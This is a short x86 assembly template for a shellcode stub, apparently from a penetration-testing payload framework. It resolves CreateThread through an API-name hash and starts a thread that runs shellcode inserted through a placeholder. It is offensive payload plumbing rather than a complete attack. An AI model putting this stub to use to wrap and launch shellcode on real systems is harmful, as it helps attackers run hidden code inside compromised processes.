[BITS 32]
[ORG 0]

  cld
  call start
  ret
delta:
%include "{search_api_path}"
start:
  pop ebp ; pop off the address of 'api_call' for calling later.
  add ebp, 1
  xor eax, eax
  push eax
  push eax
  push eax
  lea ebx, [ebp+threadstart-delta]
  push ebx
  push eax
  push eax
  push 0x160D6838 ; hash( "kernel32.dll", "CreateThread" )
  call ebp ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
  ret

threadstart:
  pop eax ; pop off the unused thread param so the prepended shellcode can just return when done.
  %include "{shellcode}"